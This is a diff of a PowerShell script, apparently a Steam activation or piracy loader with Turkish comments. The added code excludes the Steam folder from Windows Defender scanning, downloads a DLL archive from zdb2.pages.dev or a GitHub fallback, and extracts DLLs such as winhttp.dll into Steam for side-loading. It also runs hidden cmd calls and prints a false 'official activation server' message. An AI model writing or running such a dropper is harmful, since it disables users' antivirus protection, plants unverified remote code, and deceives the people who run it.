@@ -1,4 +1,5 @@
 cls
+
 [Console]::InputEncoding = [System.Text.Encoding]::UTF8
 
 $localPath = Join-Path $env:LOCALAPPDATA "steam"
@@ -10,11 +11,8 @@ $steamPath = ""
 
 function Remove-ItemIfExists($path) {
     if (Test-Path $path) {
-        # İzinleri varsayılan hale döndür
         Start-Process cmd -ArgumentList "/c icacls ""$path"" /reset /T /C" -WindowStyle Hidden -Wait
-        # Dosya özniteliklerini temizle
         Start-Process cmd -ArgumentList "/c attrib -s -h -r ""$path""" -WindowStyle Hidden -Wait
-        # Sil
         Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
     }
 }
@@ -58,15 +56,12 @@ if ([string]::IsNullOrWhiteSpace($steamPath) -or -not (Test-Path $steamPath -Pat
     exit
 }
 
-# Eski dosyaları temizle
-$verPath = Join-Path $steamPath "winhttp.dll"
-$DWMPath = Join-Path $steamPath "dwmapi.dll"
-$xinputPath = Join-Path $steamPath "xinput1_4.dll"
-
+# Eski DLL'leri temizle
+Remove-ItemIfExists (Join-Path $steamPath "winhttp.dll")
+Remove-ItemIfExists (Join-Path $steamPath "dwmapi.dll")
+Remove-ItemIfExists (Join-Path $steamPath "SYS_0xA7.dll")
+Remove-ItemIfExists (Join-Path $steamPath "xinput1_4.dll")
 Remove-ItemIfExists (Join-Path $steamPath "version.dll")
-Remove-ItemIfExists $verPath
-Remove-ItemIfExists $DWMPath
-Remove-ItemIfExists $xinputPath
 
 # --- Ana Fonksiyon ---
 
@@ -77,7 +72,7 @@ function PwStart {
 
     try {
         if (!$steamPath) { return }
-        
+
         if (!(Test-Path $localPath)) {
             New-Item $localPath -ItemType directory -Force -ErrorAction SilentlyContinue
         }
@@ -86,44 +81,46 @@ function PwStart {
         Remove-ItemIfExists (Join-Path $steamPath "steam.cfg")
         Remove-ItemIfExists (Join-Path $steamPath "package\beta")
         Remove-ItemIfExists (Join-Path $env:LOCALAPPDATA "Microsoft\Tencent")
-        
-        try { Add-MpPreference -ExclusionPath $verPath -ErrorAction SilentlyContinue } catch {}
 
-        # İndirme Listesi ve Fallback Mantığı
-        $filesToDownload = @(
-            @{ Name = "winhttp.dll"; Local = $verPath; Primary = "https://zdb2.pages.dev/winhttp.dll" },
-            @{ Name = "dwmapi.dll"; Local = $DWMPath; Primary = "https://zdb2.pages.dev/dwmapi.dll" },
-            @{ Name = "xinput1_4.dll"; Local = $xinputPath; Primary = "https://zdb2.pages.dev/xinput1_4.dll" }
-        )
+        try { Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue } catch {}
 
-        foreach ($file in $filesToDownload) {
-            $success = $false
-            
-            # 1. Deneme: Ana Sunucu
+        # dlls.zip indir ve ayıkla
+        $zipLocal = Join-Path $env:TEMP "dlls.zip"
+        $success = $false
+
+        # 1. Deneme: Ana Sunucu
+        try {
+            Invoke-RestMethod -Uri "https://zdb2.pages.dev/dlls.zip" -OutFile $zipLocal -ErrorAction Stop
+            $success = $true
+        } catch {
+            Write-Host "Primary source failed, trying fallback..." -ForegroundColor Yellow
+        }
+
+        # 2. Deneme: Fallback (GitHub)
+        if (-not $success) {
             try {
-                Invoke-RestMethod -Uri $file.Primary -OutFile $file.Local -ErrorAction Stop
+                Invoke-RestMethod -Uri "$githubBaseUrl/dlls.zip" -OutFile $zipLocal -ErrorAction Stop
                 $success = $true
             } catch {
-                Write-Host "Primary source failed for $($file.Name), trying fallback..." -ForegroundColor Yellow
+                Write-Host "Failed to download dlls.zip from both sources." -ForegroundColor Red
             }
+        }
 
-            # 2. Deneme: Fallback (GitHub)
-            if (-not $success) {
-                try {
-                    $fallbackUri = "$githubBaseUrl/$($file.Name)"
-                    Invoke-RestMethod -Uri $fallbackUri -OutFile $file.Local -ErrorAction Stop
-                    $success = $true
-                } catch {
-                    Write-Host "Failed to download $($file.Name) from both sources." -ForegroundColor Red
-                }
+        if ($success -and (Test-Path $zipLocal)) {
+            try {
+                Expand-Archive -Path $zipLocal -DestinationPath $steamPath -Force -ErrorAction Stop
+                Write-Host "DLLs extracted successfully." -ForegroundColor Green
+            } catch {
+                Write-Host "Failed to extract dlls.zip." -ForegroundColor Red
             }
+            Remove-Item $zipLocal -Force -ErrorAction SilentlyContinue
         }
 
         # Steam'i Başlat
         $steamExePath = Join-Path $steamPath "steam.exe"
         Start-Process $steamExePath
         Start-Process "steam://"
-        
+
         Write-Host "[Successfully connected to official activation server. Please login to Steam to activate]" -ForegroundColor Green
 
         for ($i = 5; $i -ge 0; $i--) {
@@ -131,7 +128,7 @@ function PwStart {
             Start-Sleep -Seconds 1
         }
 
-        # Pencereyi kapatma mantığı
+        # Pencereyi kapat
         $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
         while ($null -ne $instance -and ("powershell.exe", "WindowsTerminal.exe", "pwsh.exe" -contains $instance.ProcessName)) {
             $parentProcessId = $instance.ProcessId
